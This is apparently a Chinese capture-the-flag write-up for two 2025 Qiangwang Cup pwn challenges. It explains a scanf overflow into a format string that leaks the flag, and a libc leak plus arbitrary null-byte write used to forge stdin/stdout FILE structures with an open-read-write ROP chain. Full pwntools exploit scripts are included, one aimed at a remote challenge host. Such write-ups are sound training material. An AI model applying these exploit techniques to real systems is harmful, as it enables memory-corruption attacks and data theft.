[{"title":"2025强网杯wp","url":"/2025/10/29/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/","content":"题目链接：https://github.com/yfor-yfor/-/tree/main/2025%E5%BC%BA%E7%BD%91%E6%9D%AF\nflag-market菜单为退出或付钱\n退出即exit\n付钱如果为0xff，就break，如果不是0xff，就关闭流文件，将标志位变成0\nbreak后清空s，并且将我们输入的内容作为模式，尝试打开user.log\n最后重新再开始菜单流程\n漏洞点：\n__isoc99_scanf(&quot;%s&quot;, oflag); \n\nscanf的%s输入存在溢出，虽然oflag不在栈上，但是format格式化字符串在\n.data:00000000004040C0 oflag           db &#x27;everything is ok~&#x27;,0.data:00000000004041C0 format          db &#x27;You are so parsimonious!!!&#x27;,0.text:00000000004014AD                 lea     rax, format     ; &quot;You are so parsimonious!!!&quot;.text:00000000004014B4                 mov     rdi, rax        ; format.text:00000000004014B7                 mov     eax, 0.text:00000000004014BC                 call    _printf\n\n因此我们可以借助这个溢出，修改format为危险的格式化字符串符号\n并且题目最后会重新开始，所以之后就可以借助这个漏洞泄露内容了\n\n\n看图可知，此时堆地址和我们输入的内容都在栈上，他们的偏移量也可知为9和12\n而这个堆地址，与存储flag真实内容的堆地址偏移固定\n因此，我们可以先%9$p泄露堆地址，然后将这个值加上固定偏移当作想要pay的钱数，此时12偏移处就是存储flag地址的堆地址了，再%12$s泄露flag即可。\n因为format格式化字符串符号只能修改一次，不能中途再加入%12$s所以一开始就全部改好\n不过由于是%s的泄露，所以第一次时要输入一个随便的地址，比如0x4040c0，就不会导致报错了\n可以看到，我们输入的内容就是flag内容的所在堆地址\n\n远程成功获得flag\nexp如下\nfrom pwn import *context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)#io = process(&quot;./pwn&quot;)io=remote(&quot;8.147.135.220&quot;,20500)io.recvuntil(b&#x27;2.exit\\n&#x27;)io.sendline(b&#x27;1&#x27;)io.recvuntil(b&#x27;how much you want to pay?\\n&#x27;)io.sendline(b&#x27;255&#x27;)io.recvuntil(b&#x27;opened user.log, please report:\\n&#x27;)payload=b&#x27;a&#x27;*(0x100)+b&#x27;%9$p%12$s\\x00&#x27;io.sendline(payload)io.recvuntil(b&#x27;2.exit\\n&#x27;)io.sendline(b&#x27;1&#x27;)#gdb.attach(io)#pause()io.recvuntil(b&#x27;how much you want to pay?\\n&#x27;)#gdb.attach(io)#pause()io.sendline(p64(0x4040c0))#print(io.recv())heap_addr=int(io.recv(9),16)info(hex(heap_addr))io.recvuntil(b&#x27;2.exit\\n&#x27;)io.sendline(b&#x27;1&#x27;)io.recvuntil(b&#x27;how much you want to pay?\\n&#x27;)io.sendline(p64(heap_addr+0x1e0))io.interactive()\n\nbph\n拿到题目运行的时候，显示2.38以上才能运行，按照正常出题，应该是2.39的libc\n\n而在第一次输入的时候，栈上有存在一个libc地址，用2.39的patchelf之后，本地可以成功泄露libc\nio.recvuntil(b&quot;Please input your token: &quot;)io.send(b&quot;a&quot; * 0x28)io.recvuntil(b&quot;a&quot; * 0x28)libc_base = u64(io.recv(6).ljust(8, b&quot;\\x00&quot;)) - 0xADDAElog.success(&quot;libc: &quot; + hex(libc_base))\n\n\n远程测试之后，发现泄露的libc是对的，所以相当于开始就送了libc\n别的函数功能全是错的，不能编辑，不能泄露，不能删除，delete的整个逻辑还是有问题的，纯。。。\n只有add函数有问题\n\n重点在这，add的时候，如果size过大，就不会申请堆块，ptr就是0，那这样就相当于size-1&#x3D;0，开始的时候拿到libc了，也就是说，如果size和libcbase一样大，就能任意地址写一个0\n题目用stdin进行输入，数据会先存放在输入缓冲区，任意地址写，写到stdin里面的buf base，这样buf base和buf ptr就有差值，这个差值刚好是stdin的开头\nio.recvuntil(b&quot;Choice: &quot;)io.sendline(b&quot;1&quot;)io.recvuntil(b&quot;Size: &quot;)io.sendline(str(stdin + 0x38 + 1))io.recvuntil(b&quot;Content: &quot;)io.send(b&quot;a&quot;)dbg()io.recvuntil(b&quot;Choice: &quot;)io.send(p64(libc.address + 0x203900) * 3 + p64(libc.address + 0x203918))\n\n\n这样的话，我们fgets的时候，就能改写stdin，fgets是先把数据读到缓冲区，再拿对应的长度，所以可以写很长的数据\n我们再次改写stdin，这一次可以修改一整个buf base和buf end，改到stdout上，下次就是修改stdout\n\n这样就改写掉了\n剩下的就是写stdout，但是这里不是利用puts触发的io，puts没有成功触发，printf可以触发\n不过这里注意，io的开始只能填sh或者0xfdad1800，填上flag字符串就报错\n\n\n\nfrom pwn import *context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)io = process(&quot;./pwn&quot;)# context.terminal = [&quot;tmux&quot;, &quot;split&quot;, &quot;-h&quot;]#io = remote(&quot;47.94.202.253&quot;,32781)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)def dbg(cmd=&quot;&quot;):    gdb.attach(io, cmd)io.recvuntil(b&quot;Please input your token: &quot;)io.send(b&quot;a&quot; * 0x28)io.recvuntil(b&quot;a&quot; * 0x28)libc.address = u64(io.recv(6).ljust(8, b&quot;\\x00&quot;)) - 0xADDAElog.success(&quot;libc: &quot; + hex(libc.address))stdin = libc.sym[&quot;_IO_2_1_stdin_&quot;]info(hex(stdin))io.recvuntil(b&quot;Choice: &quot;)io.sendline(b&quot;1&quot;)io.recvuntil(b&quot;Size: &quot;)io.sendline(str(stdin + 0x38 + 1))io.recvuntil(b&quot;Content: &quot;)io.send(b&quot;a&quot;)io.recvuntil(b&quot;Choice: &quot;)io.send(p64(libc.address + 0x203900) * 3 + p64(libc.address + 0x203918))io.send(    p64(libc.address + 0x2045C0) + p64(libc.address + 0x2045C0 + 0x300))  # stdin buffake_file = flat(    &#123;        0x0: &quot; sh;&quot;,        0x10: p64(libc.sym[&quot;setcontext&quot;] + 61),        0x20: p64(libc.symbols[&quot;_IO_2_1_stdout_&quot;]),        0x78: p64(libc.address + 0x2046d0),        0x88: p64(libc.symbols[&quot;_environ&quot;] - 0x10),  # _lock        0xA0: p64(libc.symbols[&quot;_IO_2_1_stdout_&quot;]),        0xA8: p64(next(libc.search(asm(&quot;leave;ret;&quot;), executable=True))),        0xD8: p64(libc.symbols[&quot;_IO_wfile_jumps&quot;] + 0x10),        0xE0: p64(libc.symbols[&quot;_IO_2_1_stdout_&quot;] - 8),    &#125;,    filler=b&quot;\\x00&quot;,)fake_file += (    p64(libc.address + 0x2045B8)    + p64(libc.address + 0x2045E0)    + p64(libc.address + 0x2038E0))fake_file += p64(libc.address + 0x3FD000) + p64(libc.address + 0x3D2A40)pop_rax = next(libc.search(asm(&quot;pop rax;ret&quot;), executable=True))pop_rdi = next(libc.search(asm(&quot;pop rdi;ret&quot;), executable=True))pop_rsi = next(libc.search(asm(&quot;pop rsi;ret&quot;), executable=True))pop_rcx = libc.address + 0xA877Eopenat = libc.sym[&quot;openat&quot;]read = libc.sym[&quot;read&quot;]write = libc.sym[&quot;write&quot;]buf = libc.address + 0x2046d0payload = (    b&#x27;flag\\x00\\x00\\x00\\x00&#x27;    + p64(pop_rdi)    + p64(0xFFFFFFFFFFFFFF9C)    + p64(pop_rsi)    + p64(buf)    + p64(pop_rax)    + p64(0)    + p64(libc.address + 0x11EA8A)    + p64(openat))payload += (    p64(pop_rdi)    + p64(3)    + p64(pop_rsi)    + p64(buf + 0x1000)    + p64(pop_rax)    + p64(0x30)    + p64(libc.address + 0x11EA8A)    + p64(read))payload += (    p64(pop_rdi)    + p64(1)    + p64(pop_rsi)    + p64(buf + 0x1000)    + p64(pop_rax)    + p64(0x30)    + p64(libc.address + 0x11EA8A)    + p64(write))io.recv()dbg(&quot;b *0x7ffff7c8afdd\\nc&quot;)io.send(fake_file+payload)io.interactive()\n\n\n"}]